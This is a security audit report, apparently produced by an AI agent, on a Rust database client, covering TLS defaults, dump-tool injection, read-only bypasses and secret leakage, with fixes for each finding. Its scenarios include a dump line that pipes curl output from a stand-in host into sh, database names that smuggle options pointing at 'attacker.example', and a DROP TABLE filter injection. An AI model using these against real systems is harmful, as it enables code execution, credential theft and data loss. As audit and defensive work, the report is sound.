# OpenVClient security audit

Date: 2026-11-06. Scope: the `crates/` workspace at `/Users/rohansirohi/openvclient`. The directory is not a git repository, so there is no commit to pin. The tree changed while the audit ran: `crates/openvclient-storage/src/s3.rs` and `crates/openvclient-http/src/rabbitmq.rs` appeared or were wired in. They got only a quick look and are not fully covered. Line numbers are from the snapshot read on 2026-11-06 and may drift by a few lines, especially in `app.rs`.

## Executive summary

OpenVClient handles secrets carefully in the main paths. Passwords live in the OS keychain, never in `workspace.json`. Dump tools get passwords through a 0600 option file or `PGPASSWORD`, not argv. Identifier and literal quoting is consistent, and grid edits are parameterized. The crates contain no `unsafe` code.

The main risks are in three areas:

1. **Transport security defaults.** SQL Server's default encryption mode trusts any certificate. PostgreSQL's default `prefer` and its `require` mode don't verify certificates. MySQL defaults to no TLS. A network attacker in the middle can therefore capture SQL logins, PostgreSQL passwords, or replayable Entra ID access tokens.
2. **External tool invocation.** The app passes database names from the server to `pg_dump`/`psql`/`mysqldump`/`mysql` without neutralizing them. A PostgreSQL name like `host=attacker …` is read as a conninfo string, and a MySQL name like `--host=…` is read as an option. Restoring a plain-SQL dump through `psql` or `mysql` also runs client meta-commands such as `\!`, so a malicious dump file can run local commands.
3. **Read-only mode is advisory in several engines.** On SQL Server it does nothing for ad-hoc SQL: the app only sets ApplicationIntent. The Redis, MongoDB and Elasticsearch allowlists contain write operations.

There are no Critical or High findings. Every exploit here needs a man-in-the-middle position, a malicious co-tenant on a shared database server, or an untrusted file the user chooses to open.

| Severity | Count |
|---|---|
| Critical | 0 |
| High | 0 |
| Medium | 5 |
| Low | 7 |
| Info | 9 |

## Methodology

- I read `CLAUDE.md`, then reviewed by hand the core contracts (`openvclient-core`), every connector crate, `openvclient-net`, and the app's credential, logging, dialog, export and backup code.
- Targeted greps covered `unsafe`, `tracing::` calls, `Debug` formatting, `format!` calls that build SQL (all 164 were reviewed for the quoting helper used), `unwrap`/`expect`, byte-index slicing, `Command::new`, TLS options (`danger_*`, `trust_cert`, `sslmode`, `ssl`, `encrypt`) and `read_only` checks.
- I did not run target code. Connector tests need live servers, and the audit was read-only. Findings that depend on the behavior of an external server or tool are marked **needs confirmation**, with a safe way to check them locally.
- `cargo audit` is **not installed** (`error: no such command: audit`). As instructed, I did not install it, and reviewed `Cargo.lock` by eye instead.
- To check where secrets are stored, I listed the parameter keys (not the values) in the local `workspace.json`.

Threat actors considered:
- **(A) Network attacker** on the path to the database, SSH or proxy host.
- **(B) Malicious or lower-privileged co-tenant** on a shared database server who can create databases or objects.
- **(C) Author of an untrusted file** the user opens: a dump, a CSV, or a SQLite database.
- **(D) Another local user or process** on the same machine.
- **(E) The user's own mistakes**, which read-only mode is meant to stop. This is a safety control, not a trust boundary, so these findings are rated lower.

## Findings

| ID | Severity | Title | Location |
|---|---|---|---|
| F-01 | Medium | SQL Server's default encryption mode trusts any certificate, so a MITM gets the login password or Entra token | `crates/openvclient-sqlserver/src/lib.rs:137-144`, `:51-54`, `:351` |
| F-02 | Medium | PostgreSQL `prefer`/`require` and MySQL `disabled`/`required` don't verify the server, so a MITM can capture credentials | `crates/openvclient-postgres/src/lib.rs:37-41,114-118,130-135`; `crates/openvclient-mysql/src/lib.rs:35-38,94-99` |
| F-03 | Medium | Server-controlled database names reach dump tools unneutralized (pg conninfo injection, mysql option injection) | `crates/openvclient-postgres/src/admin.rs:307,335,339`; `crates/openvclient-mysql/src/admin.rs:493,520` |
| F-04 | Medium | Plain-SQL restore runs `psql`/`mysql`, which execute shell meta-commands (`\!`) found in the dump | `crates/openvclient-postgres/src/admin.rs:338-340`; `crates/openvclient-mysql/src/admin.rs:511-523` |
| F-05 | Medium | Read-only mode isn't enforced for SQL Server ad-hoc SQL (only ApplicationIntent=ReadOnly is set) | `crates/openvclient-sqlserver/src/lib.rs:145-147,781-810` |
| F-06 | Low | Read-only allowlists let writes through (Redis CONFIG/SCRIPT/CLIENT, Mongo `aggregate` `$out`, ES `_search` substring, pg/mysql `SET`) | `crates/openvclient-redis/src/lib.rs:129-139`; `crates/openvclient-mongo/src/lib.rs:405-410`; `crates/openvclient-http/src/elastic.rs:299`; `crates/openvclient-postgres/src/lib.rs:123-126`; `crates/openvclient-mysql/src/lib.rs:100-102` |
| F-07 | Low | Credentials inside a Mongo `uri` or ES/ClickHouse `url` are stored in plaintext and echoed into logs, toasts and diagnostics | `crates/openvclient-http/src/lib.rs:27-28,58`; `crates/openvclient-mongo/src/lib.rs:40,134-135`; `crates/openvclient-app/src/conns.rs:119`; `crates/openvclient-app/src/widgets/toasts.rs:60`; `crates/openvclient-app/src/views/mod.rs:93` |
| F-08 | Low | The configured SSH/proxy path is silently bypassed when a Mongo `uri` or HTTP `url` is set | `crates/openvclient-mongo/src/lib.rs:134-135`; `crates/openvclient-http/src/lib.rs:27-30`; `crates/openvclient-net/src/lib.rs:325-328` |
| F-09 | Low | SSH host keys are trusted on first use with no prompt; credentials go to an unverified host; `known_hosts` is ignored | `crates/openvclient-net/src/lib.rs:258-263`; `crates/openvclient-app/src/app.rs:~532-539` |
| F-10 | Low | The tunnel's local listener accepts any local process, which gets the SSH-side network path | `crates/openvclient-net/src/lib.rs:141,158-176,184-196` |
| F-11 | Low | `workspace.json` (with SQL history) and the log file use default umask permissions; secrets typed in SQL are kept | `crates/openvclient-app/src/store.rs:131-138,185-193`; `crates/openvclient-app/src/main.rs:48-54` |
| F-12 | Low | SQL Server's "single expression" check on WHERE filters can be bypassed without `;` | `crates/openvclient-sqlserver/src/meta.rs:12-17` |
| F-13 | Low (needs confirmation) | ClickHouse identifiers use MySQL quoting, which doesn't escape backslashes | `crates/openvclient-http/src/clickhouse.rs:22`; `crates/openvclient-core/src/sqltext.rs:15` |
| F-14 | Info | The T-SQL statement splitter misreads `]]` inside bracketed identifiers (no injection: the first fragment always fails) | `crates/openvclient-core/src/sqltext.rs:125-128` |
| F-15 | Info | `#[derive(Debug)]` on structs that hold secrets (a latent log leak) | `crates/openvclient-core/src/profile.rs:125-131`; `crates/openvclient-sqlserver/src/aad.rs:15-23`; `crates/openvclient-net/src/lib.rs:21-33,56-61` |
| F-16 | Info | Turning off "Save password" deletes the SSH/proxy secrets that were just saved | `crates/openvclient-app/src/views/conn_dialog.rs:330-348`; `crates/openvclient-app/src/store.rs:237-240` |
| F-17 | Info | External tools are found through `PATH` first; `az` is run by bare name | `crates/openvclient-postgres/src/admin.rs:263-279`; `crates/openvclient-mysql/src/admin.rs:433-446`; `crates/openvclient-sqlserver/src/aad.rs:133` |
| F-18 | Info | HTTP response bodies are read without a size limit | `crates/openvclient-http/src/lib.rs:61`; `crates/openvclient-http/src/clickhouse.rs:92,106-107` |
| F-19 | Info | CSV/TSV export doesn't neutralize spreadsheet formulas | `crates/openvclient-app/src/export.rs:45-51` |
| F-20 | Info | The MySQL option file holding the password can outlive a killed process (on Windows it uses default ACLs) | `crates/openvclient-mysql/src/admin.rs:446-474` |
| F-21 | Info | Dependency hygiene: no `cargo audit` run; `russh` is pinned exactly; pre-release `rsa`/`ssh-key` are in the tree | `crates/openvclient-net/Cargo.toml:12`, `crates/openvclient-storage/Cargo.toml:20`, `Cargo.lock` |

### F-01: SQL Server's default encryption mode trusts any certificate (Medium)

- **Location:** `crates/openvclient-sqlserver/src/lib.rs:137-144` (the `_ =>` arm calls `c.trust_cert()`). The field default is `"on"` at `:51-54` and `:351`.
- **Description:** The default `encrypt=on` sets `EncryptionLevel::Required` plus `trust_cert()`. TLS is negotiated, but the server certificate and host name are never checked. Only `required` verifies. The help text says so, but most users keep the default.
- **Scenario:** An attacker on the network path (actor A: hostile Wi-Fi, ARP or DNS spoofing) terminates TLS with a self-signed certificate and relays to the real server.
  - With SQL authentication, the TDS LOGIN7 password is only XOR-obfuscated inside the TLS tunnel, so the attacker reads it in plaintext.
  - With any Entra ID flow (`AuthMethod::aad_token`), the attacker receives a bearer token for `https://database.windows.net/`. They can replay it against the real Azure SQL server for its lifetime, about an hour.
- **Fix:**
  - Make verification the default. Rename the modes so that `on` means verify, and add an explicit `on (trust server certificate)` choice with a warning.
  - Never send an Entra token over a connection that trusts any certificate: refuse `Auth::Entra`/`Auth::Token` unless `encrypt=required`.
  - Test: a profile with Entra auth and `encrypt=on` should be rejected, or upgraded to verification.

### F-02: PostgreSQL and MySQL TLS modes don't verify the server by default (Medium)

- **Location:**
  - PostgreSQL: the default is `prefer` (`crates/openvclient-postgres/src/lib.rs:37-41`, `:100`). `tls()` turns off certificate and host name checks for every mode except `verify-full` (`:130-135`). `verify-ca` maps to `SslMode::Require` (`:116`) and gets no verification at all. The UI doesn't offer `verify-ca`, so only a hand-edited profile reaches it.
  - MySQL: the default is `disabled` (`crates/openvclient-mysql/src/lib.rs:35-38`, `:301`). `required` sets `danger_accept_invalid_certs` and `skip_domain_validation` (`:94-99`).
  - ClickHouse and Elasticsearch default to `http://` (`crates/openvclient-http/src/lib.rs:25-30`). Basic auth and the `X-ClickHouse-Key` header (`clickhouse.rs:80-82`) then travel in cleartext.
- **Scenario:** Attacker A intercepts a PostgreSQL connection that uses `prefer`. They answer the SSL request with "N", or terminate TLS when the mode is `require`. They then send `AuthenticationCleartextPassword`, and tokio-postgres replies with the password in cleartext.
  - For MySQL with TLS off: needs confirmation whether `mysql_async` asks the server for its RSA public key during `caching_sha2_password` full authentication. If it does, a fake server can supply its own key and decrypt the password. `mysql_native_password` exposes a challenge response that can be cracked offline.
- **Fix:**
  - Default new profiles to verification: `verify-full` for PostgreSQL and `verify` for MySQL. Offer "encrypt without verify" as an explicit, labelled downgrade.
  - Map `verify-ca` to CA-only verification (`danger_accept_invalid_hostnames(true)` only), or reject the value.
  - Through an SSH tunnel the host becomes `127.0.0.1` (`openvclient-net/src/lib.rs:325-328`), so host name verification needs the original host as the TLS server name.
  - Consider refusing cleartext password auth when TLS isn't verified, as libpq's `require_auth` does.

### F-03: Database names from the server reach dump tools unneutralized (Medium)

- **Location:**
  - `crates/openvclient-postgres/src/admin.rs:307`, `:335`, `:339` pass `-d <db>`.
  - `crates/openvclient-mysql/src/admin.rs:493` and `:520` pass `<db>` as a bare positional argument.
  - The database name comes from the sidebar node (`crates/openvclient-app/src/views/sidebar.rs:578-582`, giving `n.path.database`, then `dialogs.rs:307,317`). It is a name from the server catalog.
- **Description:**
  - libpq tools treat a `-d` value that contains `=` or starts with `postgresql://` as a full conninfo string. Its keywords come after `-h`, `-p` and `-U` in the keyword array, so they override them. `PGPASSWORD` (set at `admin.rs:286-288`) is still sent.
  - MySQL's `my_getopt` treats a trailing argument that starts with `--` as an option.
- **Scenario (actor B):** A co-tenant with `CREATEDB` on a shared PostgreSQL server runs `CREATE DATABASE "host=attacker.example dbname=x"`. An administrator uses OpenVClient and clicks **Back up…** on that database. `pg_dump` connects to `attacker.example` with the administrator's user name and `PGPASSWORD`. The attacker's server asks for a cleartext password and gets it.
  - On MySQL, a database named `` `--host=attacker.example` `` combined with **Restore into** makes the `mysql` client connect to the attacker. It sends a crackable `native_password` response and streams the dump file to the attacker.
  - The conninfo precedence rests on libpq's documented `expand_dbname` semantics. **Needs confirmation** with a local fixture: create the database name, point `host=` at a local `nc -l`, and run backup.
- **Fix:**
  - For PostgreSQL, pass the database as `--dbname=dbname=<escaped>`, quoting the value with conninfo rules (single quotes, with backslash-escaped `\` and `'`). That way `=` can't be interpreted. Alternatively, set the name through `PGDATABASE`, which libpq doesn't expand.
  - For MySQL, pass `--databases`/`--database=<db>`, or add a `--` end-of-options marker before the name. Also reject names that start with `-`.
  - Test: database names `host=127.0.0.2 dbname=x` and `--host=127.0.0.2` must reach the tool as literal names.

### F-04: Plain-SQL restore runs client meta-commands from the dump (Medium)

- **Location:**
  - `crates/openvclient-postgres/src/admin.rs:338-340`: `psql -f <file>` for any file not starting with `PGDMP`.
  - `crates/openvclient-mysql/src/admin.rs:511-523`: the `mysql` client with the file on stdin.
- **Description:** Both clients run their own meta-commands in batch mode: `\! cmd` (shell), `\o |cmd`, `\copy … PROGRAM` in psql, and `system`/`\!` in mysql. A dump file is attacker-controlled data (actor C). The restore dialog says only "Objects and rows … are written", so the user doesn't expect it to run local commands.
- **Scenario:** A user receives `customer.sql` (a support ticket, a public dataset, or a dump made with a hostile database name in the style of CVE-2016-5483 or CVE-2025-8714). They pick **Restore…**. The line `\! curl https://x/p | sh` runs as the user on their workstation.
- **Fix:**
  - psql: pipe the file on stdin and refuse lines that start with a backslash meta-command. Or use `pg_restore` only for custom-format dumps. On psql 17.6+ or 16.10+, prepend `\restrict <random key>` and then stream the file, so the server-side SQL runs but meta-commands are rejected.
  - mysql: pass `--commands=OFF` (MySQL 8.0.40+), or for MariaDB `--sandbox`/`--binary-mode` where available. Otherwise scan for and reject client commands before restoring.
  - In all cases, warn in the confirm dialog that SQL files can contain client commands.

### F-05: Read-only mode isn't enforced for SQL Server ad-hoc SQL (Medium)

- **Location:** `crates/openvclient-sqlserver/src/lib.rs:145-147` (`c.readonly(true)`); console execution at `:781-810` and `run_on` at `:426-435`, none of which check `read_only`. The connection dialog promises "Read-only (enforced by the server where supported)" (`crates/openvclient-app/src/views/conn_dialog.rs:243`).
- **Description:** tiberius `readonly(true)` only sets `ApplicationIntent=ReadOnly`. That is a routing hint for Availability Group read replicas. On a standalone server, an AG primary, or Azure SQL Database without a read-scale replica, every write and DDL statement succeeds. Grid edits are blocked (`meta.rs:366`), and the capabilities hide some buttons, but the SQL editor isn't guarded.
- **Scenario (actor E, real consequence):** A user marks a production profile read-only and pastes `DELETE FROM dbo.orders`. The statement succeeds.
- **Fix:**
  - At connect, run `SELECT DATABASEPROPERTYEX(DB_NAME(),'Updateability')`, and refuse write statements (by leading keyword, as Redis and Mongo do) unless the database reports `READ_ONLY`.
  - Or run each batch inside `BEGIN TRAN … ROLLBACK`, or under `SET TRANSACTION ISOLATION LEVEL SNAPSHOT` with a write check.
  - Or label SQL Server read-only mode as "UI only".
  - Test: on a read-only SQL Server profile, `CREATE TABLE t(x int)` must fail.

### F-06: Read-only allowlists let writes through (Low)

- **Redis** (`crates/openvclient-redis/src/lib.rs:129-139`, used at `:488`): the allowlist includes `CONFIG`, `CLIENT`, `SCRIPT`, `MEMORY`, `SLOWLOG`, `LATENCY` and `OBJECT`. So `CONFIG SET dir /x` plus `CONFIG SET dbfilename …` (the classic file-write primitive), `CLIENT KILL`, `SCRIPT FLUSH`, `MEMORY PURGE` and `SLOWLOG RESET` all run on a read-only connection.
- **MongoDB** (`crates/openvclient-mongo/src/lib.rs:405-410`): `aggregate` is allowed, so a pipeline with a `$out` or `$merge` stage writes or replaces collections.
- **Elasticsearch** (`crates/openvclient-http/src/elastic.rs:299`): `POST` is allowed whenever the path *contains* `_search` or `_count`. For example, `POST /idx/_delete_by_query?x=_search` deletes documents.
- **PostgreSQL and MySQL** (`postgres/src/lib.rs:123-126`, `mysql/src/lib.rs:100-102`): read-only is a session default that a user can override in the SQL editor with `SET default_transaction_read_only=off`, `BEGIN READ WRITE`, or `SET SESSION TRANSACTION READ WRITE`. This is acceptable for a guard against mistakes, but it should be documented.
- **Fix:**
  - Redis: allow subcommands only (`CONFIG GET`, `CLIENT LIST|INFO`, `SCRIPT EXISTS`, `MEMORY USAGE|STATS`, `SLOWLOG GET|LEN`, `LATENCY LATEST|HISTORY`, `OBJECT ENCODING|FREQ|IDLETIME`).
  - Mongo: reject `aggregate` pipelines that contain `$out` or `$merge`.
  - Elasticsearch: match the last path segment exactly (`_search`, `_count`, `_msearch`, `_mget`) after stripping the query string.
  - PostgreSQL/MySQL: optionally reject `SET … read_only` and `… READ WRITE` on read-only profiles.

### F-07: Credentials embedded in connection URIs/URLs leak (Low)

- **Location:**
  - Mongo `uri` (`crates/openvclient-mongo/src/lib.rs:40`, used verbatim at `:134-135`) and ES/ClickHouse `url` (`crates/openvclient-http/src/elastic.rs:35`, `lib.rs:27-28`) are ordinary text parameters. They are saved in plaintext in `workspace.json` (`store.rs:131-138`).
  - On a connect or timeout error, `Http::send` appends the raw base URL to the message (`crates/openvclient-http/src/lib.rs:58`). That message is then:
    - written to the log file (`crates/openvclient-app/src/conns.rs:119`, `widgets/toasts.rs:60`),
    - shown in toasts and error boxes,
    - included in **Copy diagnostics** (`views/mod.rs:93`).
- **Scenario:** A user pastes `https://elastic:S3cret@es.internal:9200` into Base URL, or `mongodb+srv://app:S3cret@cluster/…` into Connection string. The password then sits in plaintext in `workspace.json` and in `openvclient.log`, and is pasted into a bug report via Copy diagnostics.
  - Whether the MongoDB driver's parse errors echo the URI **needs confirmation**.
- **Fix:**
  - On save, parse the URI or URL, move its userinfo password to the keychain secret, and store the URI without it. Splice the password back in at connect time.
  - Redact `scheme://user:***@` in `Http::send` and before every log or toast. A shared `redact_url()` helper in core makes this easy.
  - Test: a URL with userinfo must never appear in `Error::message`.

### F-08: The configured tunnel is silently bypassed when a URI or URL is set (Low)

- **Location:** `open_session` rewrites only the `host` and `port` parameters to the tunnel's local endpoint (`crates/openvclient-app/src/conns.rs:244-251`, `crates/openvclient-net/src/lib.rs:325-328`). Mongo `uri` (`mongo/src/lib.rs:134-135`) and HTTP `url` (`http/src/lib.rs:27-28`) take precedence and ignore those parameters.
- **Scenario:** A user sets network mode SSH (or SOCKS) and also fills in Connection string. The tunnel opens to `localhost:27017` on the bastion, and the probe may succeed. The driver then connects **directly** across the internet, possibly in cleartext, while the UI reports the session as "via SSH". Network isolation the user relied on is defeated.
- **Fix:** When `net.mode != direct`, reject `uri`/`url`, or rewrite their authority to the local endpoint. Show the real route in the status bar.

### F-09: SSH host keys are trusted on first use, with no prompt (Low)

- **Location:** `crates/openvclient-net/src/lib.rs:258-263` accepts any key when no key is pinned. `crates/openvclient-app/src/app.rs:~532-539` pins it silently after a successful connect.
- **Description:** On first connect, and again whenever the user clears the pin, OpenVClient authenticates to whatever key it is shown. It sends the SSH password (`:288`) or performs public-key auth, then tunnels the database credentials through. `~/.ssh/known_hosts` isn't consulted. Mismatch handling after pinning is correct: it fails closed with a clear message (`:275-280`).
- **Scenario:** Attacker A intercepts the very first connection, for example on conference Wi-Fi. They capture the SSH password and the database password, which travels inside the tunnel the attacker now terminates. The attacker's key gets pinned.
- **Fix:**
  - Check `~/.ssh/known_hosts` first (`russh::keys::check_known_hosts`).
  - Otherwise, show the fingerprint and ask the user to confirm *before* authenticating. For example, return a `HostKeyUnknown` error and reconnect after the user accepts.

### F-10: Any local process can use the tunnel listener (Low)

- **Location:** `crates/openvclient-net/src/lib.rs:141` binds `127.0.0.1:0`. The accept loops at `:158-176` and `:184-196` forward every inbound connection, with no check on the peer.
- **Description:** The listener correctly binds to loopback only. But any local user or process (actor D) that finds the port can reach the remote target through the user's authenticated SSH session or proxy, for as long as the session lives. It still needs database credentials, but it bypasses the SSH and network controls that protect the database.
- **Fix:** Accept only the first connection per driver connect. Or keep an allowlist of the ephemeral ports opened by the driver's own sockets. Or, on Unix, check that the peer UID matches (`getsockopt SO_PEERCRED`/`LOCAL_PEERCRED`) and close the listener once the driver's pool is established. At minimum, document the exposure on multi-user hosts.

### F-11: Config and log files use default permissions and keep secrets typed into SQL (Low)

- **Location:**
  - `crates/openvclient-app/src/store.rs:131-138` writes with `create_dir_all` and `fs::write`; the observed modes are `drwxr-xr-x` and `-rw-r--r--`.
  - `store.rs:185-193` stores the last 500 SQL texts verbatim.
  - `crates/openvclient-app/src/main.rs:48-54` creates the log file with default permissions. It rotates at 5 MB and keeps one generation.
- **Scenario:** On a shared Linux host, where `~/.config` is often world-traversable, another user (actor D) reads `workspace.json`. Running `ALTER ROLE app PASSWORD 'x'`, `CREATE USER … IDENTIFIED BY 'x'` or `CREATE LOGIN … WITH PASSWORD = N'x'` in the editor leaves those passwords in the history. The file also gives an inventory of hosts, users, SSH hosts and key paths.
  - MySQL 1064 syntax errors can echo the text near the error, including a password literal, into the log.
  - On macOS the risk is mostly mitigated because `~/Library/Application Support` is 0700.
- **Fix:**
  - On Unix, create the config dir 0700 and the files 0600 (`OpenOptionsExt::mode`). This includes the `.json.tmp`, `broken-*.json` and log files.
  - Don't save history entries that match `PASSWORD|IDENTIFIED BY|SECRET`, or redact the literal.

### F-12: SQL Server's single-expression filter check can be bypassed (Low)

- **Location:** `crates/openvclient-sqlserver/src/meta.rs:12-17`, called at `:336` and `lib.rs:518`.
- **Description:** The check splits on `;` and `GO`. T-SQL doesn't require statement terminators, and `text_rows` runs the text as one `sp_executesql` batch. A filter of `1=1 DROP TABLE app.users --` passes the check, and the `--` comments out the appended `ORDER BY`/`OFFSET`. The second statement then runs. The existing test (`sqlserver/src/tests.rs:118`) uses only `;`.
  - The filter is typed by the same user, who can run any SQL anyway. The impact is that the documented guarantee doesn't hold, and with F-05 the filter also ignores read-only mode.
- **Fix:** Wrap the filter, for example `SELECT … WHERE (<filter>)`, and run it with `SET PARSEONLY ON` first. Or tokenize with the existing tokenizer and reject top-level statement keywords. Add a test with no `;`.

### F-13: ClickHouse identifiers are quoted with MySQL rules (Low, needs confirmation)

- **Location:** `crates/openvclient-http/src/clickhouse.rs:22` (`const D: Dialect = Dialect::MySql`) and `crates/openvclient-core/src/sqltext.rs:15`, which doubles backticks but leaves backslashes alone.
- **Description:** The ClickHouse lexer accepts backslash escapes inside back-quoted identifiers (needs confirmation against the target version). A table name that ends in `\` would escape the closing backtick, so the rest of the generated statement (`table_page`, `DROP`, `TRUNCATE`, `SHOW CREATE`) is parsed differently. The HTTP interface runs one statement per request, so this changes a query's meaning but can't stack statements. A malicious co-tenant (actor B) would have to create such a name.
  - Literals are safe: MySQL rules escape both `\` and `'`.
- **Fix:** Add a ClickHouse dialect that escapes `\` as `\\` and `` ` `` as `` \` `` in identifiers. Confirm with a local ClickHouse table named ``a\``.

### Info findings

- **F-14:** The splitter's `[` handling (`sqltext.rs:125-128`) treats the first `]` of an escaped `]]` as the end of the identifier, so a `;` inside a bracketed name causes a split. Each first fragment ends inside an unterminated identifier and errors, and `run_on` and the console stop at the first error. So this can't be used to inject, but objects whose names contain `];` can't be dropped or truncated. Fix: skip `]]` pairs.
- **F-15:** Several structs that hold secrets derive `Debug`:
  - `ConnectParams` (`secret`, at `core/src/profile.rs:125-131`)
  - `aad::Flow` (`password`, `secret`)
  - `SshAuth`, `ProxySpec` and `NetSecrets` (`net/src/lib.rs:21-33,56-61`)

  No current `{:?}` prints them, but a future `tracing::debug!(?params)` would. Fix: write manual `Debug` impls that redact the secrets, or wrap them in `secrecy::SecretString`.
- **F-16:** When "Save password" is off, the dialog saves the SSH and proxy secrets and then immediately calls `secrets::delete(id)`, which also deletes those named secrets (`conn_dialog.rs:330-348`, `store.rs:237-240`). SSH password auth then silently uses an empty password. This is a functional bug that also misleads users about where their secrets are. Fix: delete only the main secret in that branch.
- **F-17:** `find_tool` searches `PATH` before fixed locations, and `az` runs by bare name (`aad.rs:133`). A directory earlier in the user's `PATH` can shadow these tools. This is normal CLI behavior and needs local write access, so it is noted for awareness. Showing the resolved tool path in the backup result message would help.
- **F-18:** `Http::send` reads the whole body with `resp.text()` (`http/lib.rs:61`). The ClickHouse `FORMAT …` passthrough (`clickhouse.rs:92,106-107`) is also unbounded. A huge or hostile response can exhaust memory. SQL engines stream with row caps, which is good. Fix: cap the body with `bytes_stream()` and a size limit.
- **F-19:** CSV/TSV export (`export.rs:45-51`) writes cells that start with `=`, `+`, `-` or `@` verbatim. Data written by other database users then runs as spreadsheet formulas when the export is opened in Excel. Offer an option to prefix such cells with `'`.
- **F-20:** The MySQL option file (`mysql/admin.rs:446-474`) is 0600 with `create_new`, which is good. But it lives in the shared temp dir, is deleted only in `Drop`, so it is kept if the process is killed, and on Windows it uses default ACLs. Write it in the app's config dir instead, and on Windows use a per-user ACL.
- **F-21, Dependencies:**
  - `cargo audit` isn't installed, so no advisory database check was run.
  - `russh` is pinned exactly (`=0.62.7`) in `openvclient-net` and `openvclient-storage`, which blocks semver patch releases. Check RustSec advisories for russh before release.
  - The tree pulls pre-release `ssh-key 0.7.0-rc.11` and `rsa 0.10.0-rc.18`. RUSTSEC-2023-0071 (Marvin timing) affects the `rsa` crate; whether the rc line is affected **needs confirmation**. Client-side signing makes this low-impact.
  - Other crates are current: `rustls 0.23.46`, `reqwest 0.13.5`, `tokio 1.54.1`, `openssl 0.10.82`, `rusqlite 0.41.1`, `mongodb 3.10.0`, `redis 1.8.1`, `tiberius 0.13.0`.
  - Docker `tcp://`/`http://` endpoints are plain HTTP, with no TLS option (`docker/src/lib.rs:80-83`). That is root-equivalent API access in cleartext if it is used remotely.
  - Entra managed identity takes its endpoint from local environment variables (`aad.rs:112-114`). That is a local trust input, not remote SSRF. IMDS on non-Azure hosts is plain HTTP to 169.254.169.254, with low impact.

## Positive observations

- No `unsafe` code anywhere in `crates/`.
- Profile secrets go to the OS keychain (`store.rs:196-245`, keyring 4 with native stores). The local `workspace.json` has no password keys: only `host`, `port`, `user`, `sslmode` and similar.
- Passwords are kept off argv: `PGPASSWORD` env (`postgres/admin.rs:286-288`), and a MySQL option file created `create_new` with mode 0600 (`mysql/admin.rs:452-466`).
- Identifier and literal quoting goes through one helper (`sqltext.rs:13-37`), with correct doubling for each dialect (MySQL also escapes backslashes). All 164 SQL-building `format!` sites I reviewed use it, or interpolate only integers that were parsed first (`KILL`, pids).
- Grid edits (`apply_changes`) bind values as parameters in every engine. Column names are quoted and checked against the catalog (Postgres `ty()`).
- WHERE filters can't stack statements in PostgreSQL (extended protocol), MySQL (prepared `exec`), ClickHouse (one statement per HTTP request) or SQLite (rusqlite rejects multiple statements; needs confirmation, and there is no test for it). There are tests for this in pg, mysql, sqlserver and clickhouse.
- Server-side read-only enforcement where it exists: PostgreSQL `default_transaction_read_only`, MySQL session `READ ONLY`, ClickHouse `readonly=2` (can't be raised by SQL), and SQLite `SQLITE_OPEN_READ_ONLY`.
- Tunnels bind to `127.0.0.1` only. The HTTP CONNECT response read is capped at 16 KB. Once a host key is pinned, a mismatch fails closed with a clear warning about a man-in-the-middle.
- Entra tokens are cached in memory only. Errors show only the OAuth `error` code and the first line of `error_description`. The device-code flow keeps to the server's `interval` and `slow_down`.
- Result sets are streamed with row caps (`max_rows`, default 10,000), and ClickHouse uses `max_result_rows` with `result_overflow_mode=break`.
- Error diagnostics (`error.rs:107-118`) leave out profile parameters. Connection logs carry name, driver, `user@host:port/db` and the outcome, with no secrets except in the F-07 URL case.

## Prioritized remediation

1. **F-04:** Stop restore from running client meta-commands: `--commands=OFF` or sandbox for mysql, and stdin with `\restrict` or a meta-command filter for psql. A malicious file can run local code today.
2. **F-03:** Neutralize database names given to pg and mysql tools (`dbname=` quoting or `PGDATABASE`; `--`/`--databases`; reject a leading `-`).
3. **F-01:** Make SQL Server verify certificates by default, and refuse Entra tokens over trust-all TLS.
4. **F-02:** Default PostgreSQL and MySQL to verified TLS, fix the `verify-ca` mapping, and keep the original host as the TLS server name through tunnels.
5. **F-05, then F-06:** Enforce read-only for SQL Server ad-hoc SQL, then tighten the Redis, Mongo and Elasticsearch allowlists.
6. **F-07 and F-08:** Move URI/URL passwords to the keychain, redact URLs in errors, and reject a URI/URL combined with a tunnel.
7. **F-09 and F-10:** Check `known_hosts`, prompt before trusting a new key, and restrict who can use the tunnel listener.
8. **F-11:** Use 0700/0600 permissions for the config dir, workspace and logs, and redact secrets in history.
9. **F-12 and F-13:** Fix the SQL Server filter check (with a test that has no `;`) and add a ClickHouse identifier quoting dialect.
10. **Hardening (Info items):** redacting `Debug` impls, the save-secret deletion bug, response size caps, CSV formula escaping, and adding `cargo audit` and `cargo deny` to CI.
